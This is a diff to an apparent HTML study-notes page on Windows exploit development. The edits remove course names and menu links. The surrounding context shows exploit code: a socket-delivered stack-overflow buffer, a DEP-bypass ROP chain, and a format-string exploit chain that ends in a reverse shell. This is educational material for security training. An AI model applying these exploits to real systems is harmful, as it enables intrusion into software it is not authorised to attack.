@@ -117,11 +117,7 @@
           <li class="dropdown">
             <a href="./oscp.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
                 class="bi bi-laptop navicon"></i>Notes <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
-            <ul id="submenu" class="submenu open">
-              <li><a href="./ejpt.html" class="nav-link scrollto"><img src="./img/ejpt.png" alt="eJPT Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">eJPT</a></li>
-              <li><a href="./oswp.html" class="nav-link scrollto"><img src="./img/oswp_icon.png" alt="OSWP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
-              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP</a></li>
-              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSEP</a></li>
+            <ul id="submenu" class="submenu open">              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP</a></li>              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSEP</a></li>
               <li><a href="./oswe.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWE</a></li>
               <li><a href="./osed.html" class="nav-link scrollto active"><img src="./img/osed_icon.svg" alt="OSED Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSED</a></li>
               <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/osai_icon.svg" alt="OSAI Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSAI <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
@@ -134,7 +130,7 @@
             <a href="./projects.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
                 class="bi bi-code-square navicon"></i>Projects <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
             <ul class="submenu">
-              <li><a href="./sliver-c2-evasion-suite.html" class="nav-link scrollto"><i class="bi bi-shield-shaded" style="font-size: 18px; vertical-align: middle; margin-right: 6px; color: #6f42c1;"></i>Sliver C2 Evasion Suite <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+              <li><a href="./sliver-c2-evasion-suite.html" class="nav-link scrollto"><i class="bi bi-shield-shaded" style="font-size: 18px; vertical-align: middle; margin-right: 6px; color: #6f42c1;"></i>Sliver C2 Evasion Suite</a></li>
             </ul>
           </li>
         </ul>
@@ -222,7 +218,7 @@ print(''.join(f'\\\\x{b:02x}' for b in code))
 "</code></pre>
 
               <h2 id="osed-x86">2. x86 Architecture</h2>
-              <p>32-bit x86 is the entire scope of OSED. You need the memory layout, the register set, the calling conventions, and a small instruction vocabulary to read disassembly, reason about overflows, and write shellcode.</p>
+              <p>32-bit x86 is the entire scope here. You need the memory layout, the register set, the calling conventions, and a small instruction vocabulary to read disassembly, reason about overflows, and write shellcode.</p>
               <h3 id="osed-memory-layout">2.1 Program Memory Layout</h3>
               <p>A process splits into a <strong>text</strong> segment (executable, read+execute only), <strong>data/BSS</strong> for globals/statics (initialized and uninitialized), a <strong>heap</strong> for dynamic allocations growing upward, and a <strong>stack</strong> for locals, saved frame pointers, return addresses, and function arguments &mdash; growing <em>downward</em> from high to low addresses.</p>
               <h3 id="osed-registers">2.2 CPU Registers</h3>
@@ -390,7 +386,6 @@ for addr in range(start, end-1):
             sym = "?"
         print(f"JMP ESP @ 0x{addr:08x}  [{sym}]")</code></pre>
 
-
               <h2 id="osed-stack-overflow">4. Stack Buffer Overflows</h2>
               <p>The canonical Windows exploitation primitive: overflow a stack buffer to overwrite the saved return address, redirect EIP to a <code>JMP ESP</code> in a non-ASLR module, and land on shellcode that follows it on the stack.</p>
               <h3 id="osed-stack-theory">4.1 Theory</h3>
@@ -514,7 +509,6 @@ buf += shellcode
 with socket.create_connection((TARGET, PORT)) as s:
     s.send(b"GET /" + buf + b" HTTP/1.0\r\n\r\n")</code></pre>
 
-
               <h2 id="osed-reversing">7. Reverse Engineering (IDA Pro &amp; Ghidra)</h2>
               <p>You receive closed-source binaries, so static reverse engineering is how you find the bug. IDA Pro is the course tool; Ghidra is a capable free alternative with an integrated decompiler.</p>
               <h3 id="osed-ida-interface">7.1 IDA Pro Interface &amp; Basics</h3>
@@ -543,7 +537,7 @@ lm m targetapp     # e.g. base = 0x00500000
 bp ws2_32!recv "da poi(esp+8) L?400; g"
 # poi(esp+8) = third argument to recv() = the buffer pointer</code></pre>
               <h3 id="osed-ghidra-overview">7.4 Ghidra Overview</h3>
-              <p>Ghidra is NSA&rsquo;s free open-source reverse engineering framework. It provides disassembly, a built-in decompiler, scripting in Java/Python, and a GUI comparable to IDA Pro &mdash; a strong free alternative for EXP-301 targets. Import the binary (File &rarr; Import File &mdash; Ghidra auto-detects format and architecture), run auto-analysis with default settings to resolve imports and identify functions, then work in the Listing (disassembly), Decompiler (right pane, auto-synced), Symbol Tree, and References views. Navigation: <kbd>G</kbd> goes to address/label; <kbd>L</kbd> renames; <kbd>;</kbd> comments; <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>F</kbd> searches text; middle-click a function shows callers/callees.</p>
+              <p>Ghidra is NSA&rsquo;s free open-source reverse engineering framework. It provides disassembly, a built-in decompiler, scripting in Java/Python, and a GUI comparable to IDA Pro &mdash; a strong free alternative for exploit-development targets. Import the binary (File &rarr; Import File &mdash; Ghidra auto-detects format and architecture), run auto-analysis with default settings to resolve imports and identify functions, then work in the Listing (disassembly), Decompiler (right pane, auto-synced), Symbol Tree, and References views. Navigation: <kbd>G</kbd> goes to address/label; <kbd>L</kbd> renames; <kbd>;</kbd> comments; <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>F</kbd> searches text; middle-click a function shows callers/callees.</p>
               <h3 id="osed-ghidra-workflow">7.5 Ghidra Workflow &amp; Scripting</h3>
               <pre><code class="language-bash"># Launch Ghidra from command line
 ghidraRun        # opens GUI
@@ -571,7 +565,7 @@ if recv_sym:
                 </tbody>
               </table>
               <h3 id="osed-re-protocol">7.6 Protocol Reverse Engineering Workflow</h3>
-              <p>The EXP-301 course reverses the IBM Tivoli FastBackServer protocol; the workflow applies to any custom binary protocol. Hook <code>ws2_32!recv</code> in WinDbg and dump the buffer on every call to see the raw bytes the server receives. Correlate with IDA: find the function calling <code>recv</code>, rename it <code>network_recv</code>, and follow data flow into parsing routines. Identify header fields by spotting length extractions (e.g. <code>mov eax, [buf+4]</code> often pulls a 4-byte length at offset 4) and any checksum/magic validation. Reverse the checksum algorithm and reimplement it in Python so your exploit packets pass validation. The vulnerability is usually an attacker-controlled length flowing into a <code>memcpy</code> / <code>CopyMemory</code> with a fixed destination buffer.</p>
+              <p>A representative target is the IBM Tivoli FastBackServer protocol; the workflow applies to any custom binary protocol. Hook <code>ws2_32!recv</code> in WinDbg and dump the buffer on every call to see the raw bytes the server receives. Correlate with IDA: find the function calling <code>recv</code>, rename it <code>network_recv</code>, and follow data flow into parsing routines. Identify header fields by spotting length extractions (e.g. <code>mov eax, [buf+4]</code> often pulls a 4-byte length at offset 4) and any checksum/magic validation. Reverse the checksum algorithm and reimplement it in Python so your exploit packets pass validation. The vulnerability is usually an attacker-controlled length flowing into a <code>memcpy</code> / <code>CopyMemory</code> with a fixed destination buffer.</p>
               <pre><code class="language-python"># Re-implement a reversed checksum in Python (example: additive XOR checksum)
 def calc_checksum(data: bytes) -&gt; int:
     cksum = 0
@@ -683,9 +677,8 @@ EGG = b"w00tw00t"   # 8 bytes (egg repeated twice)
               <h3 id="osed-egg-win10">8.7 Porting to Windows 10</h3>
               <p>Windows 10 may shift some syscall numbers. Verify <code>NtAccessCheckAndAuditAlarm</code> by unassembling <code>ntdll!NtAccessCheckAndAuditAlarm</code> in WinDbg and reading the <code>MOV EAX, X</code> at the top of the stub. The SEH-based egghunter sidesteps this entirely (no syscall number dependency) &mdash; prefer it for exam targets running Windows 10, and test against both Windows 7 and 10 during development.</p>
 
-
               <h2 id="osed-custom-shellcode">9. Creating Custom Shellcode</h2>
-              <p>Encoders can&rsquo;t always avoid every bad character or fit a tight space. OSED teaches hand-written shellcode that resolves Win32 APIs at runtime from the PEB &mdash; portable across Windows versions and free of hardcoded addresses.</p>
+              <p>Encoders can&rsquo;t always avoid every bad character or fit a tight space. The alternative is hand-written shellcode that resolves Win32 APIs at runtime from the PEB &mdash; portable across Windows versions and free of hardcoded addresses.</p>
               <h3 id="osed-shellcode-syscall-problem">9.1 The System Call Problem</h3>
               <p>You cannot hardcode syscall numbers in portable shellcode &mdash; they differ between Windows versions. Instead, resolve Win32 API addresses at runtime by navigating PEB &rarr; Ldr &rarr; module list &rarr; PE Export Address Table.</p>
               <h3 id="osed-peb-walk">9.2 Finding kernel32.dll via the PEB</h3>
@@ -835,7 +828,7 @@ for addr in range(base, base + size - 1):
     except:
         pass</code></pre>
               <h3 id="osed-rop-virtualalloc">10.4 DEP Bypass via VirtualAlloc</h3>
-              <p>The EXP-301 course bypass calls <code>VirtualAlloc</code> to allocate a fresh <code>PAGE_EXECUTE_READWRITE</code> region, copies shellcode there, and returns into it. The ROP chain must arrange all five arguments before the call; a <code>PUSHAD</code> gadget is the idiomatic way to batch the call frame from registers in one shot.</p>
+              <p>The canonical bypass calls <code>VirtualAlloc</code> to allocate a fresh <code>PAGE_EXECUTE_READWRITE</code> region, copies shellcode there, and returns into it. The ROP chain must arrange all five arguments before the call; a <code>PUSHAD</code> gadget is the idiomatic way to batch the call frame from registers in one shot.</p>
               <pre><code class="language-python">import struct
 
 def p(x): return struct.pack("&lt;I", x)
@@ -936,7 +929,6 @@ x target!*diag*
 # If a function takes a command code and dispatches via a table, that table
 # may contain unexported functions with useful primitives (e.g. arbitrary read/write)</code></pre>
 
-
               <h2 id="osed-format-string">12. Format String Attacks</h2>
               <p>When user input reaches a <code>printf</code>-family function as the <em>format string</em> itself, the format specifiers read from and write to memory &mdash; giving you both an info leak (defeats ASLR) and an arbitrary write.</p>
               <h3 id="osed-fstr-theory">12.1 Format String Theory</h3>
@@ -1025,7 +1017,7 @@ def write_dword(addr: int, value: int) -&gt; bytes:
     return fmt</code></pre>
               <h3 id="osed-fstr-eip">12.5 Overwriting EIP &amp; Redirecting Execution</h3>
               <p>Target a saved return address on the stack, a function pointer in a dispatch table, a GOT/IAT entry, or an SEH handler pointer. Find the target&rsquo;s address via IDA (static offset) adjusted with the ASLR-leaked base, then overwrite with the address of a ROP gadget or shellcode stub.</p>
-              <pre><code class="language-python"># In the EXP-301 course: overwrite saved EIP on the server's stack
+              <pre><code class="language-python"># Overwrite saved EIP on the server's stack
 # Located by tracing the function call chain and measuring the frame depth.
 
 # After ASLR bypass leak + write primitive:
@@ -1047,7 +1039,7 @@ sub  esp, 0x40 ; ret    ; move ESP backward into the buffer
               <h3 id="osed-fstr-rce">12.7 Getting Code Execution (Full Chain)</h3>
               <p>Combine the leak, the write primitive, and the ROP chain in a single script. Send a request that gets the server to log a format string you control, leak a code pointer via <code>%N$x</code>, compute the module base, calculate the saved-EIP address, write the ROP chain start there with <code>%hn</code>, and trigger the function&rsquo;s return &mdash; the ROP chain calls VirtualAlloc/WriteProcessMemory and returns into shellcode.</p>
               <pre><code class="language-python">"""
-Full format string exploit chain (EXP-301 style):
+Full format string exploit chain:
 1. Send a request that causes the server to log a format string we control.
 2. Leak the ASLR offset: send %N$x payloads and identify a code pointer.
 3. Compute module base from the leaked pointer.
@@ -1073,7 +1065,6 @@ def exploit():
     # Stage 4: Trigger
     trigger_request()   # causes the function to return, executing our ROP chain
     print("[+] Reverse shell triggered")</code></pre>
-
 
               <h2 id="methodology">13. Methodology</h2>
               <p>A repeatable, exam-ready workflow from receiving a closed-source binary to a documented, reliable reverse shell. Complete each stage fully before advancing &mdash; a skipped step here causes a silent failure two steps later. Keep a running PoC Python script that you extend at each stage; version-control it or at minimum save snapshots.</p>
@@ -1462,13 +1453,14 @@ def exploit():
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-csharp.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-python.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-nasm.min.js"></script>
 
   <!-- Template Main JS File -->
   <script src="./js/main.js"></script>
 
   <!-- Prism JS Additional Keywords-->
   <script src="js/prism-langs.js"></script>
-  
 
   <script src="js/site.js"></script>
   <script src="js/cheatsheet-index.js"></script>
